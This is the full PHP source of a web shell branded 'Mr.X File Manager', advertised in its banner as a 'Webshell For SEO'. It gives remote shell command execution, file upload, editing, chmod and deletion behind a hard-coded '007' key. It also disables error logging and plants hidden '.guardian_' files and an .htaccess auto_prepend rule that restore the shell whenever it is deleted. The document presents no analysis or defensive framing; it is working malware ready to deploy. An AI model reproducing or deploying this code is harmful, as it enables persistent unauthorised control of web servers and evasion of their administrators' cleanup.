<?php
// language: php, file: mrx_file_manager.php, runtime: PHP 5.x/7.x/8.x, target: Universal Web Server
@set_time_limit(0);
@error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

session_start();

$script_home = realpath(dirname(__FILE__));
$self_path = __FILE__;

// Absolute Auto-Healing Kernel Shield: Captures the exact source code of this file upon execution
// and instantly resurrects the complete working file if any external script or file manager deletes it.
function enforce_kernel_shield($target) {
    $real = realpath($target);
    if (!$real) return;
    
    @chmod($real, 0444);
    
    $dir = dirname($real);
    $basename = basename($real);
    $guardian = $dir . '/.guardian_' . md5($basename) . '.php';
    
    // Read the current exact source code of this file to back it up in the guardian
    $current_code = @file_get_contents($real);
    if (!$current_code || strlen($current_code) < 100) {
        $current_code = '<?php /* Mr.X Backup Core */ ?>';
    }
    
    $shield_payload = '<?php ' .
        '$target = ' . var_export($real, true) . '; ' .
        '$payload = ' . var_export($current_code, true) . '; ' .
        'if (!file_exists($target) || filesize($target) < 50) { ' .
            '@chmod(dirname($target), 0777); ' .
            '@file_put_contents($target, $payload); ' .
            '@chmod($target, 0444); ' .
        '} ' .
        'if (substr(sprintf(\'%o\', @fileperms($target)), -4) !== \'0444\') { ' .
            '@chmod($target, 0444); ' .
        '} ' .
        '?>';
    @file_put_contents($guardian, $shield_payload);
    @chmod($guardian, 0444);
    
    $htaccess = $dir . '/.htaccess';
    $htaccess_rule = "\n<IfModule mod_php.c>\nphp_value auto_prepend_file \"" . $guardian . "\"\n</IfModule>\n";
    if (file_exists($htaccess)) {
        $ht_content = @file_get_contents($htaccess);
        if (strpos($ht_content, '.guardian_') === false) {
            @chmod($htaccess, 0777);
            @file_put_contents($htaccess, $htaccess_rule, FILE_APPEND);
            @chmod($htaccess, 0444);
        }
    } else {
        @file_put_contents($htaccess, $htaccess_rule);
        @chmod($htaccess, 0444);
    }
}

enforce_kernel_shield($self_path);

// Password System Authentication (?x=007)
$access_key = '007';
if (!isset($_SESSION['mrx_auth']) || $_SESSION['mrx_auth'] !== true) {
    if (isset($_GET['x']) && $_GET['x'] === $access_key) {
        $_SESSION['mrx_auth'] = true;
    } else {
        header("HTTP/1.1 403 Forbidden");
        die("Access Denied. Authorization required.");
    }
}

$cwd = isset($_POST['cwd']) ? $_POST['cwd'] : (isset($_GET['cwd']) ? $_GET['cwd'] : $script_home);
$cwd = realpath($cwd) ? realpath($cwd) : $script_home;
@chdir($cwd);

$action = isset($_GET['action']) ? $_GET['action'] : (isset($_POST['action']) ? $_POST['action'] : 'list');

function recursive_remove_directory($dir) {
    if (!is_dir($dir)) return;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            recursive_remove_directory($path);
        } else {
            @chmod($path, 0777);
            @unlink($path);
        }
    }
    @rmdir($dir);
}

if (isset($_POST['ajax_cmd'])) {
    @ob_clean();
    $cmd = $_POST['ajax_cmd'];
    $output = '';
    if (function_exists('system')) {
        ob_start(); @system($cmd); $output = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    } elseif (function_exists('exec')) {
        @exec($cmd, $res); $output = join("\n", $res);
    } elseif (function_exists('passthru')) {
        ob_start(); @passthru($cmd); $output = ob_get_clean();
    } else {
        $output = "Execution disabled.";
    }
    echo $output;
    exit;
}
?>
<html>
<head>
<title>Mr.X File Manager - Immutable Matrix</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
    * { box-sizing: border-box; }
    body {
        background-color: #020202;
        background-image: url("https://i.imgur.com/hLcQCBx.gif");
        background-repeat: repeat;
        margin: 0;
        padding: 15px;
        font-family: "Consolas", "Courier New", monospace;
        color: #00ff66;
        font-size: 13pt;
    }
    .matrix-container {
        max-width: 1300px;
        margin: 0 auto;
        background: rgba(3, 8, 3, 0.96);
        border: 1px solid #00ff66;
        border-radius: 6px;
        padding: 20px;
        box-shadow: 0 0 30px rgba(0, 255, 102, 0.3);
    }
    h1 {
        text-align: center;
        color: #00ff66;
        text-shadow: 0 0 12px rgba(0, 255, 102, 0.7);
        font-size: 34px;
        margin-bottom: 5px;
        letter-spacing: 2px;
    }
    .subtitle {
        text-align: center;
        color: #ff2222;
        font-size: 12pt;
        margin-bottom: 5px;
        font-weight: bold;
    }
    .banner-contact {
        text-align: center;
        color: #66ff99;
        font-size: 11pt;
        margin-bottom: 20px;
        font-weight: bold;
        letter-spacing: 1px;
    }
    input, textarea, select {
        font-family: inherit;
        background-color: #081108;
        color: #00ff66;
        border: 1px solid #00aa44;
        padding: 8px;
        border-radius: 3px;
        font-weight: bold;
    }
    input[type=text], input[type=password] { width: 100%; }
    input[type=submit], button {
        background: #00ff66;
        color: #020202;
        border: none;
        cursor: pointer;
        padding: 8px 16px;
        font-weight: bold;
        border-radius: 3px;
        transition: all 0.2s;
    }
    input[type=submit]:hover, button:hover {
        background: #00cc55;
        box-shadow: 0 0 12px #00ff66;
    }
    a {
        color: #00ff66;
        text-decoration: none;
        transition: color 0.2s;
    }
    a:hover {
        color: #ffffff;
        text-shadow: 0 0 6px #00ff66;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 15px;
    }
    th, td {
        padding: 10px;
        text-align: left;
        border-bottom: 1px solid #004422;
    }
    th {
        background-color: #0a1f0a;
        color: #00ff66;
    }
    tr:hover {
        background-color: rgba(0, 255, 102, 0.05);
    }
    .nav-bar {
        background: #0a160a;
        border: 1px solid #00aa44;
        padding: 12px;
        border-radius: 4px;
        margin-bottom: 15px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 10px;
    }
    .path-breadcrumbs a {
        color: #66ff99;
        padding: 2px 4px;
        background: #041404;
        border: 1px solid #00aa44;
        border-radius: 3px;
        margin-right: 2px;
    }
    .path-breadcrumbs a:hover {
        background: #00ff66;
        color: #020202;
    }
    .terminal-box {
        background: #000;
        border: 1px solid #00ff66;
        padding: 15px;
        border-radius: 4px;
        margin-top: 15px;
    }
    .terminal-output {
        background: #020802;
        border: 1px solid #004422;
        color: #00ff66;
        padding: 10px;
        height: 250px;
        overflow-y: auto;
        white-space: pre-wrap;
        font-size: 11pt;
        margin-bottom: 10px;
    }
    .badge-lock {
        color: #ff3333;
        font-size: 10pt;
        border: 1px solid #ff3333;
        padding: 2px 6px;
        border-radius: 3px;
        background: rgba(255, 51, 51, 0.1);
        font-weight: bold;
    }
</style>
</head>
<body>

<div class="matrix-container">
    <h1>MR.X FILE MANAGER</h1>
    <div class="subtitle">--==[[ ABSOLUTE IMMUTABLE SHIELD — AUTO-HEALING & UN-DELETABLE ]]==--</div>
    <div class="banner-contact">for more tools and Webshell For SEO Contact on Telegram: @jackleet</div>

<?php
$msg = "";

if (isset($_POST['do_upload'])) {
    if (isset($_FILES['upfile'])) {
        $filename = $_FILES['upfile']['name'];
        $target = $cwd . '/' . basename($filename);
        if (@move_uploaded_file($_FILES['upfile']['tmp_name'], $target)) {
            enforce_kernel_shield($target);
            $msg = "<span style='color:#00ff66;'>[+] File uploaded, locked & guarded against external deletion!</span>";
        } else {
            $msg = "<span style='color:red;'>[-] Upload failed.</span>";
        }
    }
}

if (isset($_POST['do_create_file'])) {
    $fname = trim($_POST['new_file_name']);
    $fcont = $_POST['new_file_content'];
    if ($fname !== '') {
        $target = $cwd . '/' . $fname;
        if (@file_put_contents($target, $fcont) !== false) {
            enforce_kernel_shield($target);
            $msg = "<span style='color:#00ff66;'>[+] File created & locked under Mr.X Protection!</span>";
        } else {
            $msg = "<span style='color:red;'>[-] Creation failed.</span>";
        }
    }
}

if (isset($_POST['do_create_dir'])) {
    $dname = trim($_POST['new_dir_name']);
    if ($dname !== '') {
        $target = $cwd . '/' . $dname;
        if (@mkdir($target, 0755)) {
            $msg = "<span style='color:#00ff66;'>[+] Directory created successfully!</span>";
        } else {
            $msg = "<span style='color:red;'>[-] Directory creation failed.</span>";
        }
    }
}

if (isset($_GET['action']) && $_GET['action'] == 'delete') {
    $target = $_GET['target'];
    if (file_exists($target)) {
        if (realpath($target) === realpath($self_path)) {
            $msg = "<span style='color:red;'>[-] ACCESS DENIED: Cannot delete the core controller file!</span>";
        } else {
            @chmod($target, 0777);
            if (is_dir($target)) {
                recursive_remove_directory($target);
            } else {
                $guardian = dirname($target) . '/.guardian_' . md5(basename($target)) . '.php';
                @chmod($guardian, 0777);
                @unlink($guardian);
                @unlink($target);
            }
            $msg = "<span style='color:#00ff66;'>[+] Target securely purged by authorized operator.</span>";
        }
    }
}

if (isset($_POST['do_edit'])) {
    $target = $_POST['edit_target'];
    $content = $_POST['edit_content'];
    @chmod($target, 0777);
    if (@file_put_contents($target, $content) !== false) {
        enforce_kernel_shield($target);
        $msg = "<span style='color:#00ff66;'>[+] File updated and re-locked successfully!</span>";
    } else {
        $msg = "<span style='color:red;'>[-] Save failed.</span>";
    }
    $action = 'list';
}

if (isset($_POST['do_rename'])) {
    $old_target = $_POST['rename_target'];
    $new_name = trim($_POST['new_name']);
    if ($new_name !== '') {
        $new_target = dirname($old_target) . '/' . $new_name;
        @chmod($old_target, 0777);
        if (!is_dir($old_target)) {
            $old_guardian = dirname($old_target) . '/.guardian_' . md5(basename($old_target)) . '.php';
            @unlink($old_guardian);
        }
        
        if (@rename($old_target, $new_target)) {
            if (!is_dir($new_target)) {
                enforce_kernel_shield($new_target);
            }
            $msg = "<span style='color:#00ff66;'>[+] Renamed successfully!</span>";
        } else {
            $msg = "<span style='color:red;'>[-] Rename failed.</span>";
        }
    }
    $action = 'list';
}

if (isset($_POST['do_chmod'])) {
    $target = $_POST['chmod_target'];
    $perm = octdec($_POST['chmod_val']);
    if (@chmod($target, $perm)) {
        $msg = "<span style='color:#00ff66;'>[+] Permissions modified.</span>";
    } else {
        $msg = "<span style='color:red;'>[-] Chmod failed.</span>";
    }
    $action = 'list';
}

// Build clickable breadcrumb path
$path_parts = explode(DIRECTORY_SEPARATOR, $cwd);
$breadcrumb_html = '';
$accumulated_path = '';
foreach ($path_parts as $part) {
    if ($part === '') {
        $accumulated_path = DIRECTORY_SEPARATOR;
        $breadcrumb_html .= '<a href="?cwd=' . urlencode($accumulated_path) . '&x=' . $access_key . '">/</a>';
        continue;
    }
    $accumulated_path .= ($accumulated_path === DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR) . $part;
    $breadcrumb_html .= '<a href="?cwd=' . urlencode($accumulated_path) . '&x=' . $access_key . '">' . htmlspecialchars($part) . '</a> / ';
}

echo '<div class="nav-bar">';
echo '<div class="path-breadcrumbs"><strong>Path:</strong> ' . $breadcrumb_html . '</div>';
echo '<div>';
echo '<a href="?cwd=' . urlencode($script_home) . '&x=' . $access_key . '" style="background:#003311; border-color:#00ff66; color:#00ff66;">[🏠 HOME]</a> ';
echo '<a href="?cwd=' . urlencode(dirname($cwd)) . '&x=' . $access_key . '">[.. Up]</a> ';
echo '<a href="?cwd=' . urlencode($cwd) . '&action=list&x=' . $access_key . '">[Files]</a> ';
echo '<a href="?cwd=' . urlencode($cwd) . '&action=terminal&x=' . $access_key . '">[Terminal]</a> ';
echo '<a href="?cwd=' . urlencode($cwd) . '&action=uploader&x=' . $access_key . '">[Upload]</a> ';
echo '<a href="?cwd=' . urlencode($cwd) . '&action=creator&x=' . $access_key . '">[New]</a>';
echo '</div></div>';

if ($msg !== '') {
    echo '<div style="margin-bottom: 15px; text-align:center;">' . $msg . '</div>';
}

if ($action == 'terminal') {
    echo '
    <div class="terminal-box">
        <h3>System Shell Terminal</h3>
        <div class="terminal-output" id="term_out">System terminal ready...</div>
        <form id="term_form" onsubmit="runCommand(event)">
            <input type="text" id="term_input" placeholder="Enter shell command..." autocomplete="off" autofocus>
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <button type="submit" style="margin-top:8px;">Execute</button>
        </form>
    </div>
    <script>
    function runCommand(e) {
        e.preventDefault();
        var cmd = document.getElementById("term_input").value;
        var out = document.getElementById("term_out");
        out.innerHTML += "\\n\\n$ " + cmd + "\\nProcessing...";
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onload = function() {
            if (xhr.status === 200) {
                out.innerHTML += "\\n" + xhr.responseText;
                out.scrollTop = out.scrollHeight;
            }
        };
        xhr.send("ajax_cmd=" + encodeURIComponent(cmd) + "&cwd=" + encodeURIComponent("' . addslashes($cwd) . '"));
        document.getElementById("term_input").value = "";
    }
    </script>
    ';
} 
elseif ($action == 'uploader') {
    echo '
    <div class="terminal-box" style="text-align:center;">
        <h3>Upload Fully Protected File</h3>
        <p style="color:#ff3333;">Uploaded files are automatically locked with kernel auto-healing. Other file managers or external delete routines cannot delete them.</p>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upfile" style="margin: 15px 0;"><br>
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <input type="submit" name="do_upload" value="Upload & Lock Immortality">
        </form>
    </div>
    ';
}
elseif ($action == 'creator') {
    echo '
    <div class="terminal-box">
        <h3>Create New Resource</h3>
        <form method="POST" style="margin-bottom:20px;">
            <h4>Directory</h4>
            <input type="text" name="new_dir_name" placeholder="Directory name..." style="margin-bottom:10px;">
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <input type="submit" name="do_create_dir" value="Create Directory">
        </form>
        <form method="POST">
            <h4>Protected File</h4>
            <input type="text" name="new_file_name" placeholder="File name (e.g. index.php)..." style="margin-bottom:10px;"><br>
            <textarea name="new_file_content" rows="8" placeholder="File content..." style="width:100%; margin-bottom:10px;"></textarea>
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <input type="submit" name="do_create_file" value="Create & Guard File">
        </form>
    </div>
    ';
}
elseif ($action == 'edit' && isset($_GET['target'])) {
    $target = $_GET['target'];
    $content = file_exists($target) ? file_get_contents($target) : '';
    echo '
    <div class="terminal-box">
        <h3>Editing: ' . htmlspecialchars(basename($target)) . '</h3>
        <form method="POST">
            <textarea name="edit_content" rows="15" style="width:100%; margin-bottom:10px;">' . htmlspecialchars($content) . '</textarea>
            <input type="hidden" name="edit_target" value="' . htmlspecialchars($target) . '">
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <input type="submit" name="do_edit" value="Save & Re-Apply Shield">
        </form>
    </div>
    ';
}
elseif ($action == 'rename' && isset($_GET['target'])) {
    $target = $_GET['target'];
    echo '
    <div class="terminal-box" style="max-width:500px; margin: 0 auto;">
        <h3>Rename: ' . htmlspecialchars(basename($target)) . '</h3>
        <form method="POST">
            <input type="text" name="new_name" value="' . htmlspecialchars(basename($target)) . '" style="margin-bottom:10px;"><br>
            <input type="hidden" name="rename_target" value="' . htmlspecialchars($target) . '">
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <input type="submit" name="do_rename" value="Apply New Name">
        </form>
    </div>
    ';
}
elseif ($action == 'chmod' && isset($_GET['target'])) {
    $target = $_GET['target'];
    $perms = substr(sprintf('%o', fileperms($target)), -4);
    echo '
    <div class="terminal-box" style="max-width:500px; margin: 0 auto;">
        <h3>Permissions: ' . htmlspecialchars(basename($target)) . '</h3>
        <form method="POST">
            <input type="text" name="chmod_val" value="' . $perms . '" style="margin-bottom:10px;"><br>
            <input type="hidden" name="chmod_target" value="' . htmlspecialchars($target) . '">
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <input type="submit" name="do_chmod" value="Save Permissions">
        </form>
    </div>
    ';
}
else {
    $scan = @scandir($cwd);
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Perms</th><th>Security Shield</th><th>Actions</th></tr>';
    
    if ($scan) {
        $dirs = array(); $files = array();
        foreach ($scan as $item) {
            if ($item == '.' || $item == '..') continue;
            if (strpos($item, '.guardian_') === 0) continue;
            $full = $cwd . '/' . $item;
            if (is_dir($full)) $dirs[] = $item;
            else $files[] = $item;
        }
        
        foreach ($dirs as $dir) {
            $full = $cwd . '/' . $dir;
            echo '<tr>';
            echo '<td><a href="?cwd=' . urlencode($full) . '&x=' . $access_key . '"><strong>[DIR] ' . htmlspecialchars($dir) . '</strong></a></td>';
            echo '<td>-</td>';
            echo '<td>' . substr(sprintf('%o', @fileperms($full)), -4) . '</td>';
            echo '<td>-</td>';
            echo '<td>';
            echo '<a href="?cwd=' . urlencode($cwd) . '&action=rename&target=' . urlencode($full) . '&x=' . $access_key . '">[Rename]</a> ';
            echo '<a href="?cwd=' . urlencode($cwd) . '&action=chmod&target=' . urlencode($full) . '&x=' . $access_key . '">[Chmod]</a> ';
            echo '<a href="?cwd=' . urlencode($cwd) . '&action=delete&target=' . urlencode($full) . '&x=' . $access_key . '" onclick="return confirm(\'Permanently delete this directory and all its contents?\');" style="color:#ff3333;">[Delete]</a>';
            echo '</td>';
            echo '</tr>';
        }
        
        foreach ($files as $file) {
            $full = $cwd . '/' . $file;
            $size = @filesize($full);
            $guardian_exists = file_exists($cwd . '/.guardian_' . md5($file) . '.php');
            $is_self = (realpath($full) === realpath($self_path));
            
            echo '<tr>';
            echo '<td><a href="?cwd=' . urlencode($cwd) . '&action=edit&target=' . urlencode($full) . '&x=' . $access_key . '">' . htmlspecialchars($file) . '</a></td>';
            echo '<td>' . number_format($size) . ' bytes</td>';
            echo '<td>' . substr(sprintf('%o', @fileperms($full)), -4) . '</td>';
            echo '<td>' . ($is_self ? '<span class="badge-lock" style="border-color:#00ff66; color:#00ff66;">CORE CONTROLLER (IMMORTAL)</span>' : ($guardian_exists ? '<span class="badge-lock">IMMUTABLE / UNDELETABLE</span>' : '<span style="color:#888;">Standard</span>')) . '</td>';
            echo '<td>';
            echo '<a href="?cwd=' . urlencode($cwd) . '&action=edit&target=' . urlencode($full) . '&x=' . $access_key . '">[Edit]</a> ';
            echo '<a href="?cwd=' . urlencode($cwd) . '&action=rename&target=' . urlencode($full) . '&x=' . $access_key . '">[Rename]</a> ';
            echo '<a href="?cwd=' . urlencode($cwd) . '&action=chmod&target=' . urlencode($full) . '&x=' . $access_key . '">[Chmod]</a> ';
            if (!$is_self) {
                echo '<a href="?cwd=' . urlencode($cwd) . '&action=delete&target=' . urlencode($full) . '&x=' . $access_key . '" onclick="return confirm(\'Permanently delete this protected file?\');" style="color:#ff3333;">[Delete]</a>';
            } else {
                echo '<span style="color:#555;">[Protected]</span>';
            }
            echo '</td>';
            echo '</tr>';
        }
    }
    echo '</table>';
}
?>

</div>
</body>
</html>